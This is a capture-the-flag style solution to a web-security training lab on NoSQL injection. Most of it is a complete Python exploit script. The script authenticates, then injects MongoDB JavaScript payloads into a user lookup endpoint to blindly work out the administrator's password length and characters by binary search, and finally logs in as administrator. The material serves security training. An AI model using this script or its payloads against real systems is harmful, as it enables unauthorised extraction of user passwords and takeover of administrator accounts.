# Exploiting NoSQL injection to extract data
> The user lookup functionality for this lab is powered by a MongoDB NoSQL database. It is vulnerable to NoSQL injection.
> To solve the lab, extract the password for the `administrator` user, then log in to their account.
> You can log in to your own account using the following credentials: `wiener:peter`.


```python
import requests
import sys
import string
from bs4 import BeautifulSoup

# --- Configuration ---
# Lab: Exploiting NoSQL injection to extract data
BASE_URL = "https://0a59001f04a8137c82283dfc00720021.web-security-academy.net"
LOGIN_ENDPOINT = BASE_URL + "/login"
TARGET_ENDPOINT = BASE_URL + "/user/lookup"

def create_authenticated_session(url):
    """Logs in as wiener to establish session."""
    session = requests.Session()
    print(f"[*] Authenticating at {url}...")
    
    # 1. Get CSRF
    resp = session.get(url)
    soup = BeautifulSoup(resp.text, 'html.parser')
    token = soup.find("input", {"name": "csrf"})['value']
    
    # 2. Login
    creds = {"username": "wiener", "password": "peter", "csrf": token}
    resp = session.post(url, data=creds)
    
    if "Log out" in resp.text:
        print("[+] Login Successful.\n")
        return session
    else:
        print("[-] Login Failed.")
        sys.exit(1)

def get_password_length(url, session):
    """Finds password length."""
    print("[*] Determining password length...")
    for i in range(1, 50):
        # Payload: Check if length > i
        payload = f"administrator' && this.password.length > {i} || 'a' == 'b"
        resp = session.get(url, params={"user": payload})
        
        sys.stdout.write(f"\r[-] Checking Length > {i}")
        sys.stdout.flush()
        
        if "administrator" not in resp.text:
            print(f"\n[+] PASSWORD LENGTH FOUND: {i}")
            return i
    return 0

def extract_password_binary(url, session, pw_length):
    """
    Extracts password using Binary Search (Greater Than comparisons).
    """
    print(f"[*] Starting Binary Search extraction for {pw_length} characters...")
    
    # Define sorted charset (a-z)
    charset = sorted(string.ascii_lowercase)
    extracted_password = ""
    
    # Iterate through each character position
    for i in range(pw_length):
        low = 0
        high = len(charset) - 1
        
        while low <= high:
            mid = (low + high) // 2
            mid_char = charset[mid]
            
            # Payload: Is the character at [i] GREATER THAN our mid_char?
            payload = f"administrator' && this.password[{i}] > '{mid_char}' || 'a' == 'b"
            
            resp = session.get(url, params={"user": payload})
            
            sys.stdout.write(f"\r[>] Extracted: {extracted_password} | Search Range: {charset[low]}-{charset[high]}")
            sys.stdout.flush()
            
            if "administrator" in resp.text:
                # TRUE: Target is greater than mid_char (Search Upper Half)
                low = mid + 1
            else:
                # FALSE: Target is mid_char or smaller (Search Lower Half)
                high = mid - 1
        
        # When loop ends, 'low' index points to the correct character
        found_char = charset[low]
        extracted_password += found_char

    print(f"\n\n[+] EXTRACTED PASSWORD: {extracted_password}")
    return extracted_password

def login_as_admin(url, session, password):
    """Verifies the password."""
    print(f"\n[*] verifying Admin Login...")
    resp = session.get(url)
    soup = BeautifulSoup(resp.text, 'html.parser')
    token = soup.find("input", {"name": "csrf"})['value']
    
    creds = {"username": "administrator", "password": password, "csrf": token}
    resp = session.post(url, data=creds)
    
    if "Log out" in resp.text and "administrator" in resp.text:
        print("[+] SUCCESS: Logged in as Administrator.")
    else:
        print("[-] Verification Failed.")

if __name__ == "__main__":
    session = create_authenticated_session(LOGIN_ENDPOINT)
    length = get_password_length(TARGET_ENDPOINT, session)
    if length:
        password = extract_password_binary(TARGET_ENDPOINT, session, length)
        login_as_admin(LOGIN_ENDPOINT, session, password)
```